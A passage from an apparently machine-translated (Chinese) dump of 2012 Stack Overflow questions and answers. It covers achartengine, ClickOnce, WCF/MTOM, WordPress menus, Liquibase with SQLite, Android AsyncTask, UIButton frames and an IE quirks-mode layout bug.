KEY_DATE 将在 x 轴上作为 dd-mmm 或 dd-mmm-yy。我不知道我需要使用什么类型的 ArrayList 来存储这些数据。

一旦我将数据存储为正确的类型，我想我知道如何使用 DBHelper 在 achartengine 中对数据进行编码。

我是一名新手程序员，需要一些代码方面的帮助。这是我的第一个应用程序准备好进入 Google Play 市场之前代码中的最后一个问题！任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T23:10:39.117

您应该查看提供的 javadoc，也许可以查看官方页面上讨论组和论坛的支持部分：[http](http://www.achartengine.org) ://www.achartengine.org 。

javadoc 应该为您提供有关可用对象和方法的信息，例如您需要在 TimeChart 或您选择的图表的数组中提供的数据类型。

讨论组可能会帮助您更快地获得答案，因为该库的使用受到限制，并且这里可能没有太多关于它的知识。

还有一个很好的时间/日期相关计算库是[http://joda-time.sourceforge.net/](http://joda-time.sourceforge.net/)

# crystal-reports - 升级使用 Crystal 并使用 ClickOnce 安装的 .NET 应用程序

> ID：11091094
> 
> 赞同：0
> 
> 时间：2012-06-18T21:10:08.903
> 
> 标签：crystal-reports, clickonce

我已经看到有关从以前版本的 Visual Studio 升级到 VS 2008 的[讨论，该版本使用 ClickOnce 分发。](https://stackoverflow.com/questions/971651/net-clickonce-not-installing-prerequisite-files)我想知道从 VS 2008 到 VS 2010。我们在编写原始应用程序时使用了 Crystal Reports XI Release 2。现在我想将它升级到 VS 2010。但是，在以前的项目中，我们还必须将 Crystal 升级到 VS 2010 的 Crystal Reports。如果我将此项目更新到 VS 2010，我假设我将被迫升级水晶的版本。我面临什么问题，将旧版本的 .NET 应用程序从 .NET 3.5 SP1 升级到 .NET 4，从 CR 11 R 2 升级到 VS 2010 的 CR，并使用 ClickOnce 进行部署？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-19T07:26:17.263

当我们升级 ClickOnce 应用程序的先决条件时，我们相应地更改了部署并将其发布到新 URL。然后我们使用旧版本的应用程序并向其添加代码，以便它会自行卸载，然后从新 URL 调用新安装。这就像一个魅力。您安装了新的先决条件（如果需要），并安装了应用程序及其新的目标框架（等）。

[这篇](http://msdn.microsoft.com/en-us/library/ff369721.aspx)关于证书过期的文章有执行卸载/重新安装的代码。我们已经使用了几次，效果很好。它甚至在 ClickOnce 应用程序的卸载对话框上单击确定。我们甚至使用此代码的变体来卸载/重新安装 VSTO 应用程序。

# asp.net - 一页网站的无会话登录。我做错了吗？

> ID：11091097
> 
> 赞同：0
> 
> 时间：2012-06-18T21:10:18.457
> 
> 标签：asp.net, security

我正在尝试为包含两个 ASP 面板的单页站点做一个非常基本的登录表单。一个面板显示登录表单控件，另一个显示用户登录时的页面内容。我没有使用任何会话，而只是在按钮单击事件上更改面板的可见性。该页面设置为不缓存，因此当用户注销时，他们不能简单地单击后退按钮重新登录。这样做有什么问题吗？

这是我正在做的代码片段：

```
protected void btnLogin_Click(object sender, EventArgs e)
{
    if (Page.IsValid)
    {
        panel1.Visible = false;
        panel2.Visible = true;
    }

}
protected void btnLogOut_Click(object sender, EventArgs e)
{

        panel1.Visible = true;
        panel2.Visible = false;

} 
```

# magento - 如何使用相同的文件 mysql4-upgrade 更新我自己的模块 magento 的所有版本

> ID：11091103
> 
> 赞同：0
> 
> 时间：2012-06-18T21:10:46.547
> 
> 标签：magento

我想知道是否有任何方法可以使用单个文件从所有版本（例如：1.7.1、1.7.2...）更新到版本 1.8.0（例如：mysql4-upgrade-1.7.0-1.8.0 ) 来自我自己的模块。有一个分隔符吗？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-19T05:59:27.953

不可能在同一个文件中执行此操作。

当 Magento 从一个版本升级到另一个版本时，如果您设置了文件，它还将升级其间的所有版本。

因此，如果有人拥有 1.7.0，并且想要升级到 1.8.0，Magento 将从 1.7.0-1.7.1 升级，然后是 1.7.1-1.7.2，然后从 1.7.0-1.8.0 升级 - 为您提供包括所有文件。

在此处阅读有关升级路径的更多信息：

[http://www.magentocommerce.com/knowledge-base/entry/magento-for-dev-part-6-magento-setup-resources](http://www.magentocommerce.com/knowledge-base/entry/magento-for-dev-part-6-magento-setup-resources)

# .net - 使用 .NET 客户端使用 Java Web 服务时遇到问题

> ID：11091107
> 
> 赞同：1
> 
> 时间：2012-06-18T21:11:03.800
> 
> 标签：.net, wcf, jboss, wcf-binding, xfire

WCF 新手，我正在尝试让 .NET 4.0 客户端使用托管在 JBOSS 中的 Web 服务。我相信 Web 服务的结果正在使用 x-fire 进行序列化。客户端使用 WCF 连接到服务。这在使用 Ntlm 对调用者进行身份验证的内部 Web 服务中。

我可以向我的客户端添加服务引用，并调用服务器上的一种方法。我已经确定请求正在发送，并且响应确实回来了。问题是响应不是传统的 SOAP 格式，我相信标准的 WCF 绑定无法解释这一点。以下是有关该应用程序的一些信息：

应用程序配置

```
 <system.serviceModel>
    <bindings>
      <basicHttpBinding>
          <binding name="myBinding" >
            <security mode="TransportCredentialOnly">
              <transport clientCredentialType="Ntlm" proxyCredentialType="None"
                  realm="" />
              <message clientCredentialType="UserName" algorithmSuite="Default"  />
            </security>
          </binding>
        </basicHttpBinding>
    </bindings>
    <client>
      <endpoint address="http://server/services/WS" binding="basicHttpBinding"
          bindingConfiguration="myBinding" contract="myContract"
          name="myEndpoint" />
    </client>
  </system.serviceModel> 
```

请求正在发送到服务器...

```
POST http://server/services/WS HTTP/1.1
Content-Type: text/xml; charset=utf-8
SOAPAction: ""
Accept-Encoding: gzip, deflate,gzip, deflate,gzip, deflate
Authorization: NTLM
Host: server
Content-Length: 145

<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><getAppInfo xmlns="http://ws.application.com"/></s:Body></s:Envelope> 
```

从服务器返回的响应（从提琴手拉出）......

```
HTTP/1.1 200 OK
Connection: close
Date: Mon, 18 Jun 2012 19:48:04 GMT
Server: Microsoft-IIS/6.0
X-Powered-By: ASP.NET
X-Powered-By: Servlet 2.5; JBoss-5.0/JBossWeb-2.1
Set-Cookie: blah; Path=/
Content-Type: multipart/related; type="application/xop+xml"; start="<soap.xml@xfire.codehaus.org>"; start-info="text/xml";      boundary="----=_Part_14_20837339.1340048884628";charset=UTF-8

------=_Part_14_20837332219.1340048884628
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: 8bit
Content-ID: <soap.xml@xfire.codehaus.org>

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><soap:Body><getAppInfoResponse xmlns="http://ws.app.com"><out><apiVersion xmlns="http://dto.ws.app.com">55</apiVersion><dbBuildNumber xmlns="http://dto.ws.app.com">12312</dbBuildNumber><appBuildNumber xmlns="http://dto.ws.app.com" xsi:nil="true" /></out></getAppInfoResponse></soap:Body></soap:Envelope>
------=_Part_14_20837332219.1340048884628-- 
```

来自.net客户端的错误消息如下......

```
The content type multipart/related; type="application/xop+xml"; start="<soap.xml@xfire.codehaus.org>"; start-info="text/xml";       boundary="----=_Part_14_20837332219.1340048884628";charset=UTF-8 of the response message does not match the content type of the binding (text/xml; charset=utf-8). If using a custom encoder, be sure that the IsContentTypeSupported method is implemented properly. The first 738 bytes of the response were: ' 
```

其余的异常只是重复来自服务器的初始响应。

我的猜测是我需要进行自定义绑定，或者类似的东西。我环顾四周寻找如何做到这一点的好例子，但他们似乎都遗漏了一些东西，阻止我将所有东西连接在一起。如果我能让自定义绑定正常工作，我的猜测是解析响应，并将 ------ 行之间的所有内容传递给 WCF 反序列化器，因为这是实际的肥皂响应。

有没有人对如何做到这一点有任何想法，可以效仿的好例子，或者完全不同的方法？

顺便说一句，网络服务是一个黑盒子，那里不会发生任何编码更改。

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-19T04:05:44.550

尝试将绑定配置更改为以下内容：

```
<binding name="myBinding" messageEncoding="Mtom"> 
```

如您所见，messageEncoding 设置为 Mtom 应该可以解决您的问题，因为这是 JBoss 服务器返回的内容。

有关此编码类型的详细说明，请参阅[MTOM](http://msdn.microsoft.com/en-us/library/aa395209.aspx)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-19T03:41:19.287

请忽略安全的东西

```
<security mode="TransportCredentialOnly">
              <transport clientCredentialType="Ntlm" proxyCredentialType="None"
                  realm="" />
              <message clientCredentialType="UserName" algorithmSuite="Default"  />
            </security> 
```

从你的绑定。因为您的消息会根据设置受到保护，并且由于 JBOSS 调度器模型与 WCF 调度器不同，所以它无法解密您的消息。

# macos - OSX Lion 中的终端在未知命令后看起来不同

> ID：11091112
> 
> 赞同：0
> 
> 时间：2012-06-18T21:11:21.217
> 
> 标签：macos, terminal, osx-lion

我今天花了一些时间通过 homebrew 和 rvm 安装 Ruby、Rails 和其他 Web 开发工具。但是我必须在终端的某个地方输入了错误的命令，因为我在 OS X Lion 上的终端（与标准终端和 iTerm2 相同）现在看起来很奇怪。

如何摆脱那个红色波浪号和黑色箭头并恢复它的默认外观？

![终端 osx 狮子](../Images/153d79aedc5e9a0fc8df623b396eb566.png)

由于我是终端命令的初学者，我将不胜感激您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-19T09:08:13.673

PS1好像改了。您现在可以做的是将其更改回来，或者干脆将其删除以恢复默认值。

在终端中，执行以下操作：

```
cd ~ 
grep "export PS1" .* 
```

然后你会看到一些输出，它可能在 .profile 或 .bashrc 中，（忽略历史记录）你可以使用任何东西来打开文件。或者只是`open .filename`在终端中，删除带有导出 PS1 的行，保存，重新登录。问题将得到解决。

# wordpress - 侧边栏中的 Wordpress 子导航菜单

> ID：11091113
> 
> 赞同：1
> 
> 时间：2012-06-18T21:11:23.257
> 
> 标签：wordpress

我有一个具有以下结构的 WordPress 网站

```
Page 1
   Sub Page 1
   Sub Page 2
Page 2
   Sub Page 1
      Sub-Sub Page 1
      Sub-Sub Page 2
      Sub-Sub Page 3
   Sub Page 2
   Sub Page 3 
```

在任何子子页面上时，我想在侧边栏导航中列出子页面。

使用下面的代码作为起点......这不适用于子子页面，因为它在导航中显示子子页面而不是子页面。

```
<?php
  if($post->post_parent)
  $children = wp_list_pages("title_li=&child_of=".$post->post_parent."&echo=0");
  else
  $children = wp_list_pages("title_li=&child_of=".$post->ID."&echo=0");
  if ($children) { ?>
  <ul>
  <?php echo $children; ?>
  </ul>
<?php } ?> 
```

谢谢

布雷特

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-20T19:09:01.830

得到它的工作。这是最终代码（从[http://cssglobe.com/post/5812/wordpress-find-pages-top-level-parent-id](http://cssglobe.com/post/5812/wordpress-find-pages-top-level-parent-id)提取，几乎没有修改）

```
<?php

if ($post->post_parent) {
    $ancestors=get_post_ancestors($post->ID);
    $root=count($ancestors)-1;
    $parent = $ancestors[$root];
} else {
    $parent = $post->ID;
}

$children = wp_list_pages("title_li=&child_of=". $parent ."&echo=0&depth=1");

if ($children) { ?>
<ul>
<?php echo $children; ?>
</ul>
<?php } ?> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-20T13:48:22.640

布雷特，

您必须检查是否有后祖父母，然后使用后祖父母的 id。您可能可以使用该`get_post_ancestors()` [函数](http://codex.wordpress.org/Function_Reference/get_post_ancestors)找出有多少祖先，然后相应地调整您的代码。

# sqlite - 无法使 generateChangeLog 在 liquibase 中工作以从现有数据库中导出数据

> ID：11091115
> 
> 赞同：0
> 
> 时间：2012-06-18T21:11:35.303
> 
> 标签：sqlite, data-migration, liquibase

我读了一些类似的问题，但我仍然不知道如何使用 liquibase 从现有数据库中导出数据或模式。我使用的数据库是 sqlite，我总是遇到问题。

```
java -jar liquibase-1.9.3.jar --driver=org.sqlite.JDBC --classpath=lib/sqlite-jdbc-3.7.2.jar --changeLogFile=test.data  --url=jdbc:sqlite:test.db --diffTypes="data" generateChangeLog 
```

错误是：迁移失败：没有这样的列：'DECIMAL_POINTS'

我只有一个包含 2 个字段的测试表：ID（整数类型）和名称（VARCHAR 类型）。

有人可以帮忙吗？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-19T14:02:32.750

我找不到更多关于将 liquibase 与 sqlite 数据库一起使用的示例。因此，我自己测试并弄清楚了，并在下面评论：当我将 sqlitejdbc 引擎从 sqlite-jdbc-3.7.2.jar 更改为 sqlitejdbc-v056.jar 时，您需要为 liquibase 选择正确的 jdbc 引擎（http:// /www.zentus.com/sqlitejdbc/），它的工作原理。所以选择合适的很重要。

# java - 异步任务步骤

> ID：11091118
> 
> 赞同：0
> 
> 时间：2012-06-18T21:11:41.200
> 
> 标签：java, android, android-asynctask

```
public class HttpPostTask extends AsyncTask<Void, Integer, Void> {

    TextView txtStatus = (TextView)findViewById(R.id.txtStatus);

    @Override
    protected Void doInBackground(Void... params) {

        EditText editText1 = (EditText)findViewById(R.id.editText1);

        try {

            HttpClient httpclient = new DefaultHttpClient();
            HttpPost httppost = new HttpPost("http://83.254.xx.xx/android/service.php");

            List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
            nameValuePairs.add(new BasicNameValuePair("action", "savedata"));
            nameValuePairs.add(new BasicNameValuePair("data", editText1.getText().toString()));
            httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

            HttpResponse response = httpclient.execute(httppost);

        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    protected void onPreExecute(){

        Log.i("debug", "onPreExecute");
    }

    protected void onProgressUpdate(Integer... progress) {

        Log.i("debug", "onProgressUpdate, " + progress[0]);
    }

    protected void onPostExecute() {

        Log.i("debug", "onPostExecute");
    }
} 
```

我在日志中看到的只是`onPreExecute`. 中的代码`doInBackground`工作正常，没有例外。我想用当前状态更新文本视图，但为什么不调用所有步骤？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T21:48:39.553

两个问题：

1.  `onPostExcute`接受与返回值类型相同的参数`doInBackground`，因此您拥有的版本不是相同的方法签名（您实际上并没有覆盖该方法）并且不会被调用。它应该是`onPostExecute(Void result)`
2.  `onProgressUpdate``publishProgress`仅在您从后台方法调用时才被调用。如果您不调用发布，则不会触发任何更新。

请注意，如果您养成使用`@Override`属性的习惯，编译器会发现 #1 之类的问题。

高温高压

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T21:31:34.393

编辑：看起来问题已被编辑......我认为这是因为您为`AsyncTask`方法声明的类型。你有

```
AsyncTask<Void, Integer, Void> 
```

但是这三种方法都是`Void`s。尝试更改`Integer`为`Void`，即

```
AsyncTask<Void, Void, Void> 
```

原答案：

An`AsyncTask`在与主 UI 线程不同的线程上运行，主 UI 线程控制 UI（以及您的 TextView）。您需要在主 UI 线程上更新 TextView。这样做的一种方法是将消息发送回主线程并实现消息处理程序，然后更新 TextView。

# iphone - UIButtons 重叠

> ID：11091119
> 
> 赞同：0
> 
> 时间：2012-06-18T21:11:41.387
> 
> 标签：iphone, objective-c, ios, xcode, uibutton

我想制作一个具有随机移动或在您触摸屏幕的位置移动的视图的应用程序。我有以下问题：我制作了一个开始随机动画的按钮，我想制作另一个停止动画的按钮。问题是两个按钮重叠，只有第一个显示在第二个的位置，我按下它，第二个显示在应该的位置。我不知道我做错了什么，可能我的子视图有问题。这是我绘制按钮的代码。

```
- (void)drawRect:(CGRect)rect {
// Drawing code

UIButton *randomMovementButton = [UIButton buttonWithType:UIButtonTypeRoundedRect];
[randomMovementButton addTarget:self 
           action:@selector(animationLoop:finished:context:)
 forControlEvents:UIControlEventTouchDown];
[randomMovementButton setTitle:@"Move Random" forState:UIControlStateNormal];
randomMovementButton.frame = CGRectMake(80.0, 210.0, 160.0, 40.0);
[self addSubview:randomMovementButton];

UIButton *stopButton = [UIButton buttonWithType:UIButtonTypeRoundedRect];
[stopButton addTarget:self
            action:@selector(stopAnimation:) 
     forControlEvents:UIControlEventTouchDown];
[randomMovementButton setTitle:@"Stop Moving Random" forState:UIControlStateNormal];
randomMovementButton.frame = CGRectMake(80.0, 210.0, 200.0, 40.0);
[self addSubview:stopButton];
} 
```

弄清楚我的错误，我对按钮的名称感到困惑并误用了它们。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T21:55:08.480

它们不重叠。第二个按钮没有框架。你写了这个：

```
UIButton *stopButton = [UIButton buttonWithType:UIButtonTypeRoundedRect];
[stopButton addTarget:self
        action:@selector(stopAnimation:) 
 forControlEvents:UIControlEventTouchDown];
[randomMovementButton setTitle:@"Stop Moving Random" forState:UIControlStateNormal];
randomMovementButton.frame = CGRectMake(80.0, 210.0, 200.0, 40.0);
[self addSubview:stopButton]; 
```

在第三和第四行你写`randomMovementButton`的不是`stopButton`. 这意味着 Title 和 frame 都设置为 randomMovementButton 而不是 stopButton。此外，第二部分和第一部分的框架是相同的（两者都是`CGRectMake(80.0, 210.0, 200.0, 40.0)`），这会使它们在您修复它时重叠。改变其中之一。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T21:18:44.863

只需为两个按钮使用不同的框架，它们就不会重叠......

# html - CSS 定位与 IE 的兼容性问题

> ID：11091121
> 
> 赞同：0
> 
> 时间：2012-06-18T21:11:45.367
> 
> 标签：html, css, internet-explorer, compatibility

我遇到了一些客户网站在 IE 中无法正确显示的问题。我目前正在使用 IE 9，但仍有一些错误出现。链接是 www.zenhomecleaning.com/ny/staff.html，我在 Windows Vista 上使用 IE 9。

我遇到的第一个问题是 div 没有留在正确的位置。该页面在 Google Chrome 上看起来不错，但在 IE 9 上测试时，两个 div 的显示不正确。

![错误 1](../Images/3c306f8a97a0ac41f61415ca9c85d4f1.png)

容器 div 是“rightpanel”，这是 HTML 和 CSS：

```
<div id="rightPanel">

            <div id="socialmedia">
                    <div><a href="http://facebook.com/zenhomeinc" target="_blank"><span id="facebook"></span></a></div>
                    <div><a href="http://twitter.com/zenhomeinc" target="_blank"><span id="twitter"></span></a></div>
                    <div><a href="http://www.youtube.com/user/zenhometherapy/videos" target="_blank"><span id="youtube"></span></a></div>
                    <div><a href="http://www.linkedin.com/company/1593810" target="_blank"><span id="linkedin"></span></a></div>

            </div><!-- end of #socialmedia -->

                <br />
                <div id="customerlobby"><a href="http://www.customerlobby.com/reviews/5095/zen-home-cleaning/" onclick=
                "window.open('http://www.customerlobby.com/reviews/5095/zen-home-cleaning/', 'ReviewPage', 
                'statusbar=no,menubar=no,toolbar=no,scrollbars=yes,resizable=yes,width=540, height=575,left=570,top=200,screenX=570,screenY=200'); 
                return false;" target="_blank"><img src="https://www.customerlobby.com/ctrack-5095" border="0" style="display: none;" alt=
                "Statistics" /><img alt="Zen Home Cleaning Customer Reviews" src="https://www.customerlobby.com/logo-serve?id=791" border="0" /></a
                ><!--End Customer Lobby--></div>

                <div id="phone">
                  <h3>Contact Us Today</h3><h1>212.462.2566</h1></div>           

        </div><!-- end of #rightPanel --> 
```

和CSS：

```
#header #rightPanel {
    width: 500px;
    height: 185px;
    margin: 5px 7px 0 0;
    float: right;
}
    #socialmedia {
        width: 153px;
        height: 26px;
        float: right;
        margin: 10px -28px 0 0;
        padding-right: 0;
    }
        #socialmedia #facebook {
            background: url(../img/icon_facebook.jpg);
            width: 26px;
            height: 26px;
            margin: 0 3px 0;
            float: left;
        }
        #socialmedia #twitter {
            background: url(../img/icon_twitter.jpg);
            width: 26px;
            height: 26px;
            margin: 0 3px 0;
            float: left;
        }
        #socialmedia #youtube {
            background: url(../img/icon_youtube.jpg);
            width: 26px;
            height: 26px;
            margin: 0 3px 0 3px;
            float: left;
        }
        #socialmedia #linkedin {
            background: url(../img/icon_linkedin.jpg);
            width: 26px;
            height: 26px;
            float: left;
            margin: 0 0 0 3px;
        }
        #rightPanel #customerlobby {
            width: 100%;
            height: 70px;
            margin: 12px 0 0 0;
            float: right;
            text-align: right;
        }

    #header #phone {
        width: 220px;
        float: right;
        text-align: right;
    }
        #header #phone h1 {
            font-family: AvenirHeavy, Arial, Helvetica, sans-serif;
            font-size: 22px;
            font-weight: 600;
            letter-spacing: .1em;
        }
        #header #phone h3 {
            font-size: 14px;
            font-weight: 400;
            letter-spacing: .1em;
            margin-bottom: -15px;
        } 
```

这个 div 应该与菜单的右侧对齐。

对于内容 div，这里是 HTML 和 CSS..

```
 <div id="main">
            <div id="content"><!-- InstanceBeginEditable name="content" -->
            <h1>Meet the Staff</h1>

                <div id="staff">

                    <div class="title">Management</div>

                    <div class="row-2">
                        <div class="staffPhoto"><h4>Operations Manager</h4><a     class="various fancybox.iframe" rel="staff" href=
                        "staff/marina.html" ><img src="staff/img/marina-thumb.jpg" alt="Green Cleaning Services, Marina Gospodinova" /><p>Marina Gospodinova</p></a></div>
                        <div class="staffPhoto"><h4>Field Manager</h4><a class="various fancybox.iframe" rel="staff" href=
                        "staff/mariyana.html" ><img src="staff/img/mariyana-thumb.jpg" alt="Green Cleaning Services, Mariyana Nedelcheva" /><p>Mariyana Nedelcheva</p></a></div>

                    </div>

                    <div class="title">Client Services</div>

                    <div class="row-2">
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/lucille.html" ><img src=
                    "staff/img/lucille-thumb.jpg" alt="Green Cleaning Services, Lucille Manariotis" /><p>Lucille Manariotis</p></a></div>

                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href=
                        "staff/akia.html" ><img src="staff/img/akia-thumb.jpg" alt="Green Cleaning Services, Akia Ridley" /><p>Akia Ridley</p></a></div>

                    </div>

                    <div style="margin-bottom: -50px; "></div>

                    <div class="title">Quality Control Services</div>
                    <div class="row-4">

                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/carlos.html" ><img src="staff/img/carlos-thumb.jpg" alt="Green Cleaning Services, " /><p>Carlos</p></a></div>

                    <div style="margin-bottom: -50px; "></div>

                    <div class="title">Cleaning Consultants</div>
                    <div class="row-6">
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/alesha.html" ><img src="staff/img/alesha-thumb.jpg" alt="Green Cleaning Services, " /><p>Alesha</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/awilda.html" ><img src="staff/img/awilda-thumb.jpg" alt="Green Cleaning Services, " /><p>Awilda</p></a></div>                    
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/beverly.html" ><img src="staff/img/beverly-thumb.jpg" alt="Green Cleaning Services, " /><p>Beverly</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/carlos.html" ><img src="staff/img/carlos-thumb.jpg" alt="Green Cleaning Services, " /><p>Carlos</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/christin.html" ><img src="staff/img/christin-thumb.jpg" alt="Green Cleaning Services, " /><p>Christin</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/crystal.html" ><img src="staff/img/crystal-thumb.jpg" alt="Green Cleaning Services, " /><p>Crystal</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/daphne.html" ><img src="staff/img/daphne-thumb.jpg" alt="Green Cleaning Services, " /><p>Daphne</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/denise.html" ><img src="staff/img/denise-thumb.jpg" alt="Green Cleaning Services, " /><p>Denise</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/francis.html" ><img src="staff/img/francis-thumb.jpg" alt="Green Cleaning Services, " /><p>Francis</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/glenda.html" ><img src="staff/img/glenda-thumb.jpg" alt="Green Cleaning Services, " /><p>Glenda</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/iris.html" ><img src="staff/img/iris-thumb.jpg" alt="Green Cleaning Services, " /><p>Iris</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/ivelisse.html" ><img src="staff/img/ivelisse-thumb.jpg" alt="Green Cleaning Services, " /><p>Ivelisse</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/jovana.html" ><img src="staff/img/jovana-thumb.jpg" alt="Green Cleaning Services, " /><p>Jovana</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/kashmire.html" ><img src="staff/img/kashmire-thumb.jpg" alt="Green Cleaning Services, " /><p>Kashmire</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/leyda.html" ><img src="staff/img/leyda-thumb.jpg" alt="Green Cleaning Services, " /><p>Leyda</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/lissy.html" ><img src="staff/img/lissy-thumb.jpg" alt="Green Cleaning Services, " /><p>Lissy</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/ljumnije.html" ><img src="staff/img/ljumnije-thumb.jpg" alt="Green Cleaning Services, " /><p>Ljumnije</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/marina2.html" ><img src="staff/img/marina2-thumb.jpg" alt="Green Cleaning Services, " /><p>Marina</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/mary.html" ><img src="staff/img/mary-thumb.jpg" alt="Green Cleaning Services, " /><p>Mary</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/mildred.html" ><img src="staff/img/mildred-thumb.jpg" alt="Green Cleaning Services, " /><p>Mildred</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/miquel.html" ><img src="staff/img/miquel-thumb.jpg" alt="Green Cleaning Services, " /><p>Miquel</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/mirjeta.html" ><img src="staff/img/mirjeta-thumb.jpg" alt="Green Cleaning Services, " /><p>Mirjeta</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/nefertiti.html" ><img src="staff/img/nefertiti-thumb.jpg" alt="Green Cleaning Services, " /><p>Nefertiti</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/raina.html" ><img src="staff/img/raina-thumb.jpg" alt="Green Cleaning Services, " /><p>Raina</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/reina.html" ><img src="staff/img/reina-thumb.jpg" alt="Green Cleaning Services, " /><p>Reina</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/teresa.html" ><img src="staff/img/teresa-thumb.jpg" alt="Green Cleaning Services, " /><p>Teresa</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/torra.html" ><img src="staff/img/torra-thumb.jpg" alt="Green Cleaning Services, " /><p>Torra</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/vanessa.html" ><img src="staff/img/vanessa-thumb.jpg" alt="Green Cleaning Services, " /><p>Vanessa</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/victor.html" ><img src="staff/img/victor-thumb.jpg" alt="Green Cleaning Services, " /><p>Victor</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/yahaira.html" ><img src="staff/img/yahaira-thumb.jpg" alt="Green Cleaning Services, " /><p>Yahaira</p></a></div>
                    <div class="staffPhoto"><a class="various fancybox.iframe" rel="staff" href="staff/yahaira2.html" ><img src="staff/img/yahaira2-thumb.jpg" alt="Green Cleaning Services, " /><p>Yahaira</p></a></div>

                     </div>

                     <div class="spacerXL"></div><div class="spacerXL"></div><div class="spacerXL"></div><div class="spacerXL"></div>

                </div><!-- end of #staff"-->
  </script><!-- InstanceEndEditable --></div>
            <!-- end of #content -->
        </div><!-- end of #main --> 
```

和 CSS：

```
#main {
display: block;
width: 100%;
max-width: 990px;
margin: 0 auto;
padding-top: 50px;
}

#main #content {
    width: 95%;
    max-width: 990px;
    margin: 0 auto;
}

#main #content .small {
    font-size: 11px;
}

    #main #content p {
        font-family: 'Open Sans', Arial, Helvetica, sans-serif;
        font-size: 14px;
        letter-spacing: .1em;
    } 
```

我尝试调整 div 并尝试不同的样式以正确对齐内容，但无济于事。非常感谢我遇到的这两个问题的任何指导。非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T21:18:47.233

首先设置一个有效的 DOCTYPE 标头，以便浏览器知道 HTML 或 XHTML 期望什么。

如果你想支持不喜欢 HTML5 的浏览器，我会推荐这个

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
 ... 
```

如果您不尝试严格使用您的代码，我可以在此之后看到更多问题。

然后在尝试修复特定问题之前通过[HTML Validator](http://validator.w3.org/check)运行您的页面。当我通过验证器运行您的 URL 时，它会报告（除其他外）

```
Line 1, Column 85: Comments seen before doctype. Internet Explorer will go into the quirks mode. 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T21:24:35.737

它以怪癖模式呈现。我`<!doctype html>`在您的源代码的顶部看到，但它之前有一条评论，这似乎阻止了 IE 识别它。删除该注释，或将其移至 DOCTYPE 下方。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-18T21:42:53.440

